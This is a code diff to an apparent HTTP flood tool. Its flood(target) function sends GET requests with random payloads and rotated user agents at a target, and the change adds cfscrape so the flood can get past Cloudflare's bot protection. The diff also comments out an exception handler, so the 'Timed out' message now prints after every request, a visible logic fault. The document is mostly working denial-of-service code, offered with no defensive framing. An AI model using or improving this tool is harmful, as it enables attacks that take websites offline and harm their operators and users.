@@ -3,6 +3,9 @@ import requests
 import random
 import tools.randomData as randomData
 from colorama import Fore
+import cfscrape
+
+scraper = cfscrape.create_scraper(delay=7)  # returns a CloudflareScraper instance
 
 # Load user agents
 user_agents = []
@@ -23,8 +26,8 @@ headers = {
 def flood(target):
     payload = str(random._urandom(random.randint(10, 150)))
     try:
-        r = requests.get(target, params=payload, headers=headers, timeout=4)
-    except requests.exceptions.ConnectTimeout:
+        r = scraper.get(target, params=payload, headers=headers, timeout=4)
+    #except requests.exceptions.ConnectTimeout:
         print(f"{Fore.RED}[!] {Fore.MAGENTA}Timed out{Fore.RESET}")
     except Exception as e:
         print(
